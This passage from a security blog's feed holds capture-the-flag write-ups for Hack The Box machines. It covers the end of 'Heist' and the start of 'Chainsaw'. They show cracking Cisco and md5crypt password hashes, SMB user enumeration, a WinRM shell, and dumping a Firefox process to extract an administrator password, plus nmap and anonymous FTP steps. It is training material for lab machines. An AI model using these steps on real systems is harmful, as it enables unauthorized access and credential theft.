class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">version 12.2</span><br><span class="line">no service pad</span><br><span class="line">service password-encryption</span><br><span class="line">!</span><br><span class="line">isdn switch-type basic-5ess</span><br><span class="line">!</span><br><span class="line">hostname ios-1</span><br><span class="line">!</span><br><span class="line">security passwords min-length 12</span><br><span class="line">enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91</span><br><span class="line">!</span><br><span class="line">username rout3r password 7 0242114B0E143F015F5D1E161713</span><br><span class="line">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">ip ssh authentication-retries 5</span><br><span class="line">ip ssh version 2</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">router bgp 100</span><br><span class="line"> synchronization</span><br><span class="line"> bgp log-neighbor-changes</span><br><span class="line"> bgp dampening</span><br><span class="line"> network 192.168.0.0 mask 300.255.255.0</span><br><span class="line"> timers bgp 3 9</span><br><span class="line"> redistribute connected</span><br><span class="line">!</span><br><span class="line">ip classless</span><br><span class="line">ip route 0.0.0.0 0.0.0.0 192.168.0.1</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">access-list 101 permit ip any any</span><br><span class="line">dialer-list 1 protocol ip list 101</span><br><span class="line">!</span><br><span class="line">no ip http server</span><br><span class="line">no ip http secure-server</span><br><span class="line">!</span><br><span class="line">line vty 0 4</span><br><span class="line"> session-timeout 600</span><br><span class="line"> authorization exec SSH</span><br><span class="line"> transport input ssh</span><br></pre></td></tr></table></figure><p>For the type 7 passwords I used <a href="http://www.ifm.net.nz/cookbooks/passwordcracker.html" target="_blank" rel="noopener">this online tool</a> to crack them:<br><img src="/images/hackthebox/heist/4.png" alt=""></p><p><img src="/images/hackthebox/heist/5.png" alt=""><br>And for the other hash I cracked it with john:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;heist# cat hash.txt </span><br><span class="line">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;heist# john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt .&#x2F;hash.txt </span><br><span class="line">Created directory: &#x2F;root&#x2F;.john</span><br><span class="line">Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;</span><br><span class="line">Use the &quot;--format&#x3D;md5crypt-long&quot; option to force loading these as that type instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128&#x2F;128 AVX 4x3])</span><br><span class="line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">stealth1agent    (?)</span><br><span class="line">1g 0:00:01:09 DONE (2019-11-29 12:17) 0.01440g&#x2F;s 50492p&#x2F;s 50492c&#x2F;s 50492C&#x2F;s stealth323..stealth1967</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;heist#</span><br></pre></td></tr></table></figure><h2 id="Enumerating-Users-–-gt-Shell-as-Chase-–-gt-User-Flag"><a href="#Enumerating-Users-–-gt-Shell-as-Chase-–-gt-User-Flag" class="headerlink" title="Enumerating Users –&gt; Shell as Chase –&gt; User Flag"></a>Enumerating Users –&gt; Shell as Chase –&gt; User Flag</h2><p>So far we have <code>hazard</code> and <code>rout3r</code> as potential usernames and <code>stealth1agent</code>, <code>$uperP@ssword</code>, <code>Q4)sJu\Y8qz*A3?d</code> as potential passwords.<br>I tried different combinations and I could authenticate to <code>smb</code> as <code>hazard : stealth1agent</code>, however there weren’t any useful shares:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;heist# smbclient --list &#x2F;&#x2F;heist.htb&#x2F; -U &#39;hazard&#39;</span><br><span class="line">Enter WORKGROUP\hazard&#39;s password: </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;heist#</span><br></pre></td></tr></table></figure><p>I used <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py" target="_blank" rel="noopener"><code>lookupsid.py</code></a> from <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener"><code>impacket</code></a> to enumerate the other users:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;heist# &#x2F;opt&#x2F;impacket&#x2F;examples&#x2F;lookupsid.py hazard:stealth1agent@heist.htb</span><br><span class="line">Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Brute forcing SIDs at heist.htb</span><br><span class="line">[*] StringBinding ncacn_np:heist.htb[\pipe\lsarpc]</span><br><span class="line">[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112</span><br><span class="line">500: SUPPORTDESK\Administrator (SidTypeUser)</span><br><span class="line">501: SUPPORTDESK\Guest (SidTypeUser)</span><br><span class="line">503: SUPPORTDESK\DefaultAccount (SidTypeUser)</span><br><span class="line">504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)</span><br><span class="line">513: SUPPORTDESK\None (SidTypeGroup)</span><br><span class="line">1008: SUPPORTDESK\Hazard (SidTypeUser)</span><br><span class="line">1009: SUPPORTDESK\support (SidTypeUser)</span><br><span class="line">1012: SUPPORTDESK\Chase (SidTypeUser)</span><br><span class="line">1013: SUPPORTDESK\Jason (SidTypeUser)</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;heist#</span><br></pre></td></tr></table></figure><p>Then I could authenticate to <code>winrm</code> as <code>chase : Q4)sJu\Y8qz*A3?d</code>:<br><img src="/images/hackthebox/heist/6.png" alt=""></p><h2 id="Administrator-Password-from-Firefox-Process-Dump-–-gt-Shell-as-Administrator-–-gt-Root-Flag"><a href="#Administrator-Password-from-Firefox-Process-Dump-–-gt-Shell-as-Administrator-–-gt-Root-Flag" class="headerlink" title="Administrator Password from Firefox Process Dump –&gt; Shell as Administrator –&gt; Root Flag"></a>Administrator Password from Firefox Process Dump –&gt; Shell as Administrator –&gt; Root Flag</h2><p>After enumerating the box for a while I noticed that <code>Firefox</code> was installed on the box which is unusual:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Chase\appdata\Roaming&gt; ls</span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Chase\appdata\Roaming</span><br><span class="line">Mode                LastWriteTime         Length Name                                         ----                -------------         ------ ----                                         d-----        4&#x2F;22&#x2F;2019   7:14 AM                Adobe                                       d---s-        4&#x2F;22&#x2F;2019   7:14 AM                Microsoft                                   d-----        4&#x2F;22&#x2F;2019   8:01 AM                Mozilla                                     *Evil-WinRM* PS C:\Users\Chase\appdata\Roaming&gt; cd Mozilla</span><br><span class="line">*Evil-WinRM* PS C:\Users\Chase\appdata\Roaming\Mozilla&gt; ls</span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Chase\appdata\Roaming\Mozilla</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name        </span><br><span class="line">----                -------------         ------ ----</span><br><span class="line"></span><br><span class="line">d-----        4&#x2F;22&#x2F;2019   8:01 AM                Extensions     </span><br><span class="line">d-----        4&#x2F;22&#x2F;2019   8:01 AM                Firefox</span><br><span class="line">d-----        4&#x2F;22&#x2F;2019   8:01 AM                SystemExtensionsDev</span><br><span class="line">*Evil-WinRM* PS C:\Users\Chase\appdata\Roaming\Mozilla&gt;</span><br></pre></td></tr></table></figure><p>And there were some <code>Firefox</code> processes running:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Chase\appdata\Roaming\Mozilla&gt; ps</span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName</span><br><span class="line">-------  ------    -----      -----     ------     --  -- -----------</span><br><span class="line">----------</span><br><span class="line"> REDACTED</span><br><span class="line">----------</span><br><span class="line">    358      26    16304     279888       0.77   1408   1 firefox</span><br><span class="line">    343      19     9876     264068       0.88   4980   1 firefox</span><br><span class="line">    408      31    17344      60988       1.92   5096   1 firefox</span><br><span class="line">    390      30    26184      58192       9.94   6556   1 firefox</span><br><span class="line">   1232      68   110456     183140      22.83   7076   1 firefox</span><br><span class="line">----------</span><br><span class="line"> REDACTED</span><br><span class="line">----------</span><br><span class="line">*Evil-WinRM* PS C:\Users\Chase\appdata\Roaming\Mozilla&gt;</span><br></pre></td></tr></table></figure><p>I uploaded <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank" rel="noopener"><code>procdump.exe</code></a> and dumped one of these processes:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Chase\appdata\Roaming\Mozilla&gt; cd C:\Windows\System32\spool\drivers\color</span><br><span class="line">*Evil-WinRM* PS C:\windows\system32\spool\drivers\color&gt; upload procdump64.exe</span><br><span class="line">Info: Uploading procdump64.exe to C:\windows\system32\spool\drivers\color\procdump64.exe</span><br><span class="line"></span><br><span class="line">Data: 455560 bytes of 455560 bytes copied</span><br><span class="line"></span><br><span class="line">Info: Upload successful!</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color&gt; .\procdump64.exe -accepteula -ma 4980</span><br><span class="line"></span><br><span class="line">ProcDump v9.0 - Sysinternals process dump utility</span><br><span class="line">Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line">[21:15:31] Dump 1 initiated: C:\Windows\System32\spool\drivers\color\firefox.exe_191129_211531.dmp</span><br><span class="line">[21:15:32] Dump 1 writing: Estimated dump file size is 265 MB.</span><br><span class="line">[21:15:35] Dump 1 complete: 265 MB written in 3.6 seconds</span><br><span class="line">[21:15:35] Dump count reached.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color&gt;</span><br></pre></td></tr></table></figure><p>Then I uploaded <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/strings" target="_blank" rel="noopener"><code>strings.exe</code></a> and used it on the dump and saved the output to another file:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\windows\system32\spool\drivers\color&gt; upload strings64.exe</span><br><span class="line">Info: Uploading strings64.exe to C:\windows\system32\spool\drivers\color\strings64.exe</span><br><span class="line"></span><br><span class="line">Data: 218676 bytes of 218676 bytes copied</span><br><span class="line"></span><br><span class="line">Info: Upload successful!</span><br><span class="line">*Evil-WinRM* PS C:\windows\system32\spool\drivers\color&gt; cmd &#x2F;c &quot;strings64.exe -accepteula firefox.exe_191129_211531.dmp &gt; firefox.exe_191129_211531.txt&quot;</span><br><span class="line">cmd.exe :</span><br><span class="line">    + CategoryInfo          : NotSpecified: (:String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="line">Strings v2.53 - Search for ANSI and Unicode strings in binary images.       </span><br><span class="line">Copyright (C) 1999-2016 Mark Russinovich             </span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line">*Evil-WinRM* PS C:\windows\system32\spool\drivers\color&gt;</span><br></pre></td></tr></table></figure><p>I searched for the word “password” and found Administrator’s credentials exposed in some <code>GET</code> requests:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\windows\system32\spool\drivers\color&gt; findstr &quot;password&quot; .&#x2F;firefox.exe_191129_211531.txt</span><br><span class="line">MOZ_CRASHREPORTER_RESTART_ARG_1&#x3D;localhost&#x2F;login.php?login_username&#x3D;admin@support.htb&amp;login_password&#x3D;4dD!5&#125;x&#x2F;re8]FBuZ&amp;login&#x3D;                  </span><br><span class="line">MOZ_CRASHREPORTER_RESTART_ARG_1&#x3D;localhost&#x2F;login.php?login_username&#x3D;admin@support.htb&amp;login_password&#x3D;4dD!5&#125;x&#x2F;re8]FBuZ&amp;login&#x3D;                  </span><br><span class="line">RG_1&#x3D;localhost&#x2F;login.php?login_username&#x3D;admin@support.htb&amp;login_password&#x3D;4dD!5&#125;x&#x2F;re8]FBuZ&amp;login&#x3D;</span><br><span class="line">MOZ_CRASHREPORTER_RESTART_ARG_1&#x3D;localhost&#x2F;login.php?login_username&#x3D;admin@support.htb&amp;login_password&#x3D;4dD!5&#125;x&#x2F;re8]FBuZ&amp;login&#x3D;</span><br><span class="line">browser.safebrowsing.passwords.enabled                                      </span><br><span class="line">services.sync.engine.passwords.validation.percentageChance </span><br><span class="line">security.ask_for_password</span><br><span class="line">----------</span><br><span class="line"> REDACTED</span><br><span class="line">----------</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/heist/7.png" alt=""><br>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p><p>Previous Hack The Box write-up : <a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a><br>Next Hack The Box write-up : <a href="/hack-the-box/wall/">Hack The Box - Wall</a></p>]]></content:encoded>
      
      <comments>https://0xrick.github.io/hack-the-box/heist/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Hack The Box - Chainsaw</title>
      <link>https://0xrick.github.io/hack-the-box/chainsaw/</link>
      <guid>https://0xrick.github.io/hack-the-box/chainsaw/</guid>
      <pubDate>Sat, 23 Nov 2019 03:00:00 GMT</pubDate>
      <description>
      
        My write-up / walkthrough for Chainsaw from Hack The Box.
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="Hack-The-Box-Chainsaw"><a href="#Hack-The-Box-Chainsaw" class="headerlink" title="Hack The Box - Chainsaw"></a>Hack The Box - Chainsaw</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys, today Chainsaw retired and here’s my write-up about it. It was a great machine with vulnerable smart contracts and other fun stuff. I enjoyed it and I learned a lot while solving it. It’s a Linux box and its ip is <code>10.10.10.142</code>, I added it to <code>/etc/hosts</code> as <code>chainsaw.htb</code>. Let’s jump right in !</p><p><img src="/images/hackthebox/chainsaw/0.png" alt=""></p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# nmap -sV -sT -sC -o nmapinitial chainsaw.htb</span><br><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2019-11-22 18:34 EET</span><br><span class="line">Nmap scan report for chainsaw.htb (10.10.10.142)</span><br><span class="line">Host is up (1.2s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json</span><br><span class="line">| -rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol</span><br><span class="line">|_-rw-r--r--    1 1001     1001           44 Nov 22 05:03 address.txt</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.10.xx.xx</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 5</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 02:dd:8a:5d:3c:78:d4:41:ff:bb:27:39:c1:a2:4f:eb (RSA)</span><br><span class="line">|   256 3d:71:ff:d7:29:d5:d4:b2:a6:4f:9d:eb:91:1b:70:9f (ECDSA)</span><br><span class="line">|_  256 7e:02:da:db:29:f9:d2:04:63:df:fc:91:fd:a2:5a:f2 (ED25519)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 394.56 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure><p>We got <code>ssh</code> on port 22 and <code>ftp</code> on port 21.</p><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>Anonymous authentication was allowed on the <code>ftp</code> server, so let’s check what’s in there:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# ftp chainsaw.htb </span><br><span class="line">Connected to chainsaw.htb.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (chainsaw.htb:root): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json</span><br><span class="line">-rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol</span><br><span class="line">-rw-r--r--    1 1001     1001           44 Nov 22 05:03 address.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; mget *</span><br><span class="line">mget WeaponizedPing.json? y</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for WeaponizedPing.json (23828 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">23828 bytes received in 0.26 secs (88.2424 kB&#x2F;s)</span><br><span class="line">mget WeaponizedPing.sol? y</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for WeaponizedPing.sol (243 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">243 bytes received in 0.00 secs (2.3174 MB&#x2F;s)</span><br><span class="line">mget address.txt? y</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for address.txt (44 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">44 bytes received in 0.00 secs (421.2623 kB&#x2F;s)</span><br><span class="line">ftp&gt; exit</span><br><span class="line">221 Goodbye.</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure><p><code>WeaponizedPing.sol</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line">contract WeaponizedPing </span><br><span class="line">&#123;</span><br><span class="line">  string store = <span class="string">"google.com"</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getDomain</span><span class="params">()</span> <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> <span class="params">(string)</span> </span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> store;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setDomain</span><span class="params">(string _value)</span> <span class="title">public</span> </span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      store = _value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>WeaponizedPing.json</code>:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"contractName"</span>: <span class="string">"WeaponizedPing"</span>,</span><br><span class="line">  <span class="attr">"abi"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"constant"</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">"inputs"</span>: [],</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"getDomain"</span>,</span><br><span class="line">      <span class="attr">"outputs"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"name"</span>: <span class="string">""</span>,</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"string"</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"payable"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"stateMutability"</span>: <span class="string">"view"</span>,</span><br><span class="line">      <span class="attr">"type"</span>: <span class="string">"function"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"constant"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"inputs"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"name"</span>: <span class="string">"_value"</span>,</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"string"</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"setDomain"</span>,</span><br><span class="line">      <span class="attr">"outputs"</span>: [],</span><br><span class="line">      <span class="attr">"payable"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"stateMutability"</span>: <span class="string">"nonpayable"</span>,</span><br><span class="line">      <span class="attr">"type"</span>: <span class="string">"function"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"bytecode"</span>: <span 